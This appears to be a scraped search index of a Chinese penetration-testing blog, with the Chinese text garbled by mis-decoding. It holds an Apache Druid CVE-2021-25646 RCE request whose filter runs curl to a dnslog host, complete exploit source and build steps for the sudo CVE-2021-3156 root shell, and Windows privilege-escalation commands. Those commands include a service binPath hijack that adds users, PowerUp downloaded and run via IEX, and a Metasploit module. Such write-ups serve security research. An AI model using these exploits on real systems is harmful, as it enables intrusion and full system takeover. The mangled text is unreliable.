{\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('curl xxxxx.dnslog.cn')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:2","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.3 ä¿®å¤ å‡çº§ Apache Druid åˆ°æœ€æ–°çš„ç‰ˆæœ¬ å¯¹ Apache Druid è¿›è¡Œæƒé™æ§åˆ¶ï¼Œåªå…è®¸å—ä¿¡ä»»çš„ä¸»æœºè®¿é—®é›†ç¾¤æœåŠ¡å™¨ ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:3","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["sudo","æ¼æ´å¤ç°"],"title":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç° ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["sudo","æ¼æ´å¤ç°"],"title":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1 æ¼æ´ä»‹ç» ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["sudo","æ¼æ´å¤ç°"],"title":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.1 åŸç† ä¸€ä¸ªç±» Unix æ“ä½œç³»ç»Ÿåœ¨å‘½ä»¤å‚æ•°ä¸­è½¬ä¹‰åæ–œæ æ—¶å­˜åœ¨åŸºäºå †çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ å½“ sudo é€šè¿‡ -s æˆ– -i å‘½ä»¤è¡Œé€‰é¡¹åœ¨ shell æ¨¡å¼ä¸‹è¿è¡Œå‘½ä»¤æ—¶ï¼Œå®ƒå°†åœ¨å‘½ä»¤å‚æ•°ä¸­ä½¿ç”¨åæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚ä½†ä½¿ç”¨ -s æˆ– -i æ ‡å¿—è¿è¡Œ sudoedit æ—¶ï¼Œå®é™…ä¸Šå¹¶æœªè¿›è¡Œè½¬ä¹‰ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚åªè¦å­˜åœ¨ sudoers æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ /etc/sudoersï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨æœ¬åœ°æ™®é€šç”¨æˆ·åˆ©ç”¨ sudo è·å¾—ç³»ç»Ÿ root æƒé™ã€‚ ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["sudo","æ¼æ´å¤ç°"],"title":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.2 å½±å“ç‰ˆæœ¬ Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:2","tags":["sudo","æ¼æ´å¤ç°"],"title":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2 å¤ç° ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["sudo","æ¼æ´å¤ç°"],"title":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.1 å¿«é€Ÿåˆ¤æ–­æ¼æ´æ–¹æ³• ä»¥é root ç”¨æˆ·ç™»å½•ç³»ç»Ÿï¼Œå¹¶ä½¿ç”¨å‘½ä»¤ sudoedit -s / å¦‚æœå“åº”ä¸€ä¸ªä»¥ sudoedit: å¼€å¤´çš„æŠ¥é”™ï¼Œé‚£ä¹ˆè¡¨æ˜å­˜åœ¨æ¼æ´ã€‚ å¦‚æœå“åº”ä¸€ä¸ªä»¥ usage: å¼€å¤´çš„æŠ¥é”™ï¼Œé‚£ä¹ˆè¡¨æ˜è¡¥ä¸å·²ç»ç”Ÿæ•ˆã€‚ ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:1","tags":["sudo","æ¼æ´å¤ç°"],"title":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.2 ç¼–è¯‘è¿è¡Œ ä¸€å…±ä¸‰ä¸ªæ–‡ä»¶ï¼š hax.c // Tested on: // Ubunutu 20.0.4.1 LTS // Sudo version 1.8.31 // Sudoers policy plugin version 1.8.31 // Sudoers file grammar version 46 // Sudoers I/O plugin version 1.8.31 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdint.h\u003e #include \u003cunistd.h\u003e #include \u003cctype.h\u003e #define SUDOEDIT_PATH \"/usr/bin/sudoedit\" int main(int argc, char *argv[]) { // CTF quality exploit below. char *s_argv[]={ \"sudoedit\", \"-u\", \"root\", \"-s\", \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\\", \"\\\\\", \"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB123456\\\\\", NULL }; char *s_envp[]={ \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"X/P0P_SH3LLZ_\", \"\\\\\", \"LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", \"LC_ALL=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", \"LC_CTYPE=C.UTF-8@AAAAAAAAAAAAAA\", NULL }; printf(\"**** CVE-2021-3156 PoC\\n\"); execve(SUDOEDIT_PATH, s_argv, s_envp); return 0; } lib.c #include \u003cunistd.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e static void __attribute__ ((constructor)) _init(void); static void _init(void) { printf(\"[+] bl1ng bl1ng! We got it!\\n\"); setuid(0); seteuid(0); setgid(0); setegid(0); static char *a_argv[] = { \"sh\", NULL }; static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL }; execv(\"/bin/sh\", a_argv); } Makefileï¼š all: rm -rf libnss_X mkdir libnss_X gcc -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c clean: rm -rf libnss_X sudo-hax-me-a-sandwich ç¼–è¯‘ï¼š tar -zxvf CVE-2021-3156.tar.gz cd CVE-2021-3156 make ç›´æ¥æ‰§è¡Œï¼š./sudo-hax-me-a-sandwich å³å¯ã€‚ ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:2","tags":["sudo","æ¼æ´å¤ç°"],"title":"CVE-2021-3156 sudo ææƒæ¼æ´å¤ç°","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"Windows ææƒæ–¹å¼æ€»ç»“","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"Windows ææƒæ–¹å¼æ€»ç»“ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:0:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"1 å‰è¨€ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:1:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"1.1 ææƒåŸºç¡€å‘½ä»¤ # æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯ systeminfo # å¦‚æœè¦æŸ¥çœ‹ç‰¹å®šçš„ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ systeminfo | findstr /B /C:\"OSåç§°\" /C:\"OSç‰ˆæœ¬\" # ä¸»æœºå Hostname # ç¯å¢ƒå˜é‡ Set # æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ Net user # æŸ¥çœ‹æœåŠ¡ pid å· tasklist /svc|find \"TermService\" netstat -ano|find \"3389\" # æŸ¥çœ‹ç³»ç»Ÿå wmic os get caption # æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯ wmic qfe get Description,HotFixID,InstalledOn # å¦‚æœè¦å®šä½åˆ°ç‰¹å®šçš„è¡¥ä¸å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ wmic qfe get Description,HotFixID,InstalledOn | findstr /C:\"KB4346084\" /C:\"KB4509094\" # æŸ¥çœ‹å½“å‰å®‰è£…ç¨‹åº wmic product get name,version å…¶ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹ ç¯å¢ƒå˜é‡ï¼Œå› ä¸ºæœ‰çš„è½¯ä»¶ç¯å¢ƒå˜é‡å¯èƒ½è®¾ç½®åœ¨å…¶å®ƒè·¯å¾„ä¸­ï¼Œè€Œåœ¨è¯¥è·¯å¾„ä¸‹çš„æ–‡ä»¶æ˜¯å…·æœ‰å†™æƒé™çš„ï¼Œå°±å¯ä»¥é€šè¿‡æ›¿æ¢æ–‡ä»¶æ¥è¾¾åˆ°ææƒæ“ä½œ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:1:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"1.2 Windows æƒé™åˆ’åˆ† Userï¼šæ™®é€šç”¨æˆ·æƒé™ï¼Œç³»ç»Ÿä¸­æœ€å®‰å…¨çš„æƒé™ï¼Œåˆ†é…ç»™è¯¥ç»„çš„é»˜è®¤æƒé™ä¸å…è®¸æˆå‘˜ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„è®¾ç½®æˆ–ç”¨æˆ·èµ„æ–™ Administratorï¼šç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥åˆ©ç”¨ Windows çš„æœºåˆ¶å°†è‡ªå·±æå‡ä¸º System æƒé™ï¼Œä»¥ä¾¿æ“ä½œ SAM æ–‡ä»¶ç­‰ Systemï¼šç³»ç»Ÿæƒé™ï¼Œå¯ä»¥å¯¹ SAM ç­‰æ•æ„Ÿæ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œå¾€å¾€éœ€è¦ Administrator æƒé™æå‡åˆ° System æƒé™æ‰å¯ä»¥å¯¹æ•£åˆ—å€¼è¿›è¡Œ Dump æ“ä½œ TrustedInstallerï¼šæœ€é«˜æƒé™ï¼Œ å¯¹äºç³»ç»Ÿæ–‡ä»¶ï¼Œå³ä½¿ System æƒé™ä¹Ÿæ— æ³•è¿›è¡Œä¿®æ”¹ï¼Œåªæœ‰ TrustedInstaller æƒé™æ‰å¯ä»¥ä¿®æ”¹æ–‡ä»¶ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:1:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"1.3 å¸¸è§ webshell æ‰€å¤„çš„æƒé™ é€šå¸¸çš„ webshell æƒé™å¦‚ä¸‹ï¼š ASPã€PHP - åŒ¿åæƒé™ ASPX - user æƒé™ JSP - é€šå¸¸æ˜¯ç³»ç»Ÿæƒé™ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:1:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"2 ç³»ç»Ÿå†…æ ¸ææƒ æ­¤ææƒæ–¹æ³•å³æ˜¯é€šè¿‡ç³»ç»Ÿæœ¬èº«å­˜åœ¨çš„ä¸€äº›æ¼æ´ï¼Œæœªæ›¾æ‰“ç›¸åº”çš„è¡¥ä¸è€Œæš´éœ²å‡ºæ¥çš„ææƒæ–¹æ³•ï¼Œä¾æ‰˜å¯ä»¥æå‡æƒé™çš„ EXP å’Œå®ƒä»¬çš„è¡¥ä¸ç¼–å·ï¼Œè¿›è¡Œæå‡æƒé™ã€‚ æ£€æŸ¥ï¼š systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn # msf post/windows/gather/enum_patches Windows-Exploit-Suggester ä¸‹é¢æ˜¯è¾…åŠ©ææƒçš„é¡µé¢ï¼š https://github.com/SecWiki/windows-kernel-exploits https://wiki.0-sec.org/#/index https://github.com/neargle/win-powerup-exp-index http://blog.neargle.com/win-powerup-exp-index/ https://detect.secwx.com ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:2:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"3 é…ç½®ä¸å½“ææƒ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:3:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"3.1 ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯ Windows ç³»ç»ŸæœåŠ¡æ–‡ä»¶åœ¨æ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½å¹¶æ‰§è¡Œï¼Œå¹¶è°ƒç”¨å¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯¹è¿™äº›è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶æ‹¥æœ‰å¯å†™æƒé™ï¼Œå°±å¯ä»¥å°†è¯¥æ–‡ä»¶æ›¿æ¢æˆä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶éšç€ç³»ç»ŸæœåŠ¡çš„å¯åŠ¨è·å¾—ç³»ç»Ÿæƒé™ï¼Œä½†ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒWindows æ˜¯ä»¥ System æƒé™æ‰§è¡Œçš„ï¼Œå› æ­¤ï¼Œå…¶æ–‡ä»¶å¤¹ã€æ–‡ä»¶å’Œæ³¨å†Œè¡¨é”®å€¼éƒ½æ˜¯å—åˆ°å¼ºè®¿é—®æ§åˆ¶æœºåˆ¶ä¿æŠ¤çš„ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ä»æœ‰äº›æœåŠ¡æ²¡æœ‰å¾—åˆ°æœ‰æ•ˆä¿æŠ¤ã€‚ 3.1.1 accesschk ä¸‹è½½åœ°å€ï¼šhttps://download.sysinternals.com/files/SysinternalsSuite.zip ç”¨ accesschk.exe å·¥å…·æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯ä¿®æ”¹çš„æœåŠ¡ï¼š accesschk.exe -uwcqv \"XXX\" * /accepteula \u003e 1.txt //XXXä¸ºå½“å‰ç”¨æˆ·å å¦‚æœå‡ºç° SERVICE_ALL_ACCESS åˆ™è¡¨ç¤ºå½“å‰ç”¨æˆ·æ‹¥æœ‰ä¿®æ”¹è¯¥æœåŠ¡çš„æƒé™ æŸ¥çœ‹è¯¥æœåŠ¡å¯åŠ¨æ—¶çš„æƒé™ sc qc VMTools ç„¶åä¿®æ”¹æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ # æ³¨æ„è¿™é‡Œçš„\"=\"åé¢è¦ç•™æœ‰ç©ºæ ¼ sc config VMTools binPath= \"net user test1 abc123! /add\" # æŸ¥çœ‹æŸ¥è¯¢è¯¥æœåŠ¡çš„æ‰§è¡Œè·¯å¾„æ˜¯å¦ä¿®æ”¹æˆåŠŸ sc qc VMTools é‡å¯æœåŠ¡ sc stop VMTools sc start VMTools ä½†è¦æ³¨æ„è¿™é‡Œå¯åŠ¨æ—¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºå½“ä¸€ä¸ªæœåŠ¡åœ¨ Windows ç³»ç»Ÿä¸­å¯åŠ¨åï¼Œå®ƒå¿…é¡»å’ŒæœåŠ¡æ§åˆ¶ç®¡ç†å™¨é€šä¿¡ã€‚å¦‚æœæ²¡æœ‰é€šä¿¡ï¼ŒæœåŠ¡æ§åˆ¶ç®¡ç†å™¨ä¼šè®¤ä¸ºå‡ºç°äº†é”™è¯¯ï¼Œå¹¶ä¼šç»ˆæ­¢è¿™ä¸ªè¿›ç¨‹ã€‚ä½†æ˜¯æˆ‘ä»¬çš„å‘½ä»¤å·²ç»ä»¥ SYSTEM æƒé™è¿è¡Œäº†ï¼Œå¹¶ä¸”æˆåŠŸæ·»åŠ äº†ä¸€ä¸ªç”¨æˆ·ã€‚ ä¿¡æ¯ åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ icacls ä¹Ÿå¯ä»¥ï¼š ç¡®å®šå†™å…¥æƒé™ï¼šicacls \"C:\\Program Files\\program folder\" ã€ŒMã€è¡¨ç¤ºä¿®æ”¹ã€ã€ŒFã€è¡¨ç¤ºå®Œå…¨æ§åˆ¶ ã€ŒCIã€ä»£è¡¨ä»å±å®¹å™¨å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹ ã€ŒOIã€ä»£è¡¨ä»å±æ–‡ä»¶å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹ å¸¸ç”¨å‘½ä»¤ï¼š icacls \"C:\\Program Files\\*\" 2\u003enul | findstr \"(M)\" | findstr \"Everyone\" icacls \"C:\\Program Files(x86)\\*\" 2\u003enul | findstr \"(M)\" | findstr \"Everyone\" icacls \"C:\\Program Files\\*\" 2\u003enul | findstr \"(M)\" | findstr \"BUILTIN\\Users\" icacls \"C:\\Program Files(x86)\\*\" 2\u003enul | findstr \"(M)\" | findstr \"BUILTIN\\Users\" 3.1.2 PowerSploit powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks\" powershell.exe -exec bypass -Command \"\u0026 {Import-Module D:/PowerUp.ps1; Invoke-AllChecks}\" \u003e 1.txt åˆ—å‡ºäº†æ‰€æœ‰å¯èƒ½å­˜åœ¨é—®é¢˜çš„æœåŠ¡ï¼š ServiceNameï¼šå¯èƒ½å­˜åœ¨æ¼æ´çš„æœåŠ¡ Pathï¼šè¯¥æœåŠ¡çš„å¯æ‰§è¡Œç¨‹åºçš„è·¯å¾„ StartNameï¼šæœåŠ¡è¿è¡Œè´¦å· AbuseFunctionï¼šåˆ©ç”¨æ–¹å¼ æ ¹æ® AbuseFunction ä¸­çš„åˆ©ç”¨æ–¹å¼æ‰§è¡Œè„šæœ¬ï¼Œè¿™é‡Œä»¥ VGAuthService æœåŠ¡ä¸ºä¾‹ æ·»åŠ ä¸€ä¸ªåä¸º userï¼Œå¯†ç ä¸º 123456 çš„è´¦å·ï¼š powershell.exe -exec bypass -Command \"\u0026 {Import-Module C:/PowerUp.ps1;Invoke-ServiceAbuse -Name 'VGAuthService' -Username user -Password 123456}\" 3.1.3 metasploit use exploit/windows/local/service_permissions set AGGRESSIVE true set session 1 exploit ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:3:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"3.2 å¯ä¿¡ä»»æœåŠ¡è·¯å¾„ææƒ å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´åˆ©ç”¨äº† Windows æ–‡ä»¶è·¯å¾„è§£æçš„ç‰¹æ€§ï¼Œå¦‚æœä¸€ä¸ªæœåŠ¡è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶æ²¡æœ‰æ­£ç¡®åœ°å¤„ç†æ‰€å¼•ç”¨çš„å®Œæ•´è·¯å¾„åï¼ŒåŒæ—¶æ”»å‡»è€…è¯¥æ–‡ä»¶è·¯å¾„æœ‰å¯å†™æƒé™ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä¸Šä¼ æ–‡ä»¶æ¥åŠ«æŒè·¯å¾„åã€‚ ä¾‹å¦‚ Windows ç³»ç»Ÿå¯åŠ¨æŸæœåŠ¡æ—¶æŸ¥æ‰¾çš„æ–‡ä»¶è·¯å¾„ä¸º C:\\Program Files\\Some Folder\\Services.exeã€‚ å¯¹äºè¯¥è·¯å¾„ä¸­çš„æ¯ä¸€ä¸ªç©ºæ ¼ï¼ŒWindows éƒ½ä¼šå°è¯•å¹¶æ‰§è¡Œä¸ç©ºæ ¼å‰é¢çš„åå­—ç›¸åŒ¹é…çš„ç¨‹åºï¼Œå› æ­¤ Windows ä¼šä»¥ä¾æ¬¡å¦‚ä¸‹é¡ºåºæŸ¥æ‰¾ä¸€ä¸‹å¯åŠ¨ç¨‹åºï¼š C:\\Program.exe C:\\Program Files\\Some.exe C:\\Program Files\\Some Folder\\Services.exe æ­¤æ—¶å¦‚æœæˆ‘ä»¬å¯¹ C:\\è·¯å¾„æˆ–è€… C:\\Program Files æœ‰å¯å†™çš„æƒé™ï¼Œå°±å¯ä»¥ä¸Šä¼  Program.exe æˆ– Some.exe ç¨‹åºåˆ°ç›¸åº”ç›®å½•ä¸‹ï¼Œå½“æœåŠ¡é‡æ–°å¯åŠ¨æ—¶ï¼Œå°±ä¼šä»¥ System æƒé™æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ç¨‹åºã€‚ åˆ©ç”¨æ¡ä»¶ï¼š æœåŠ¡è·¯å¾„æœªä½¿ç”¨åŒå¼•å· 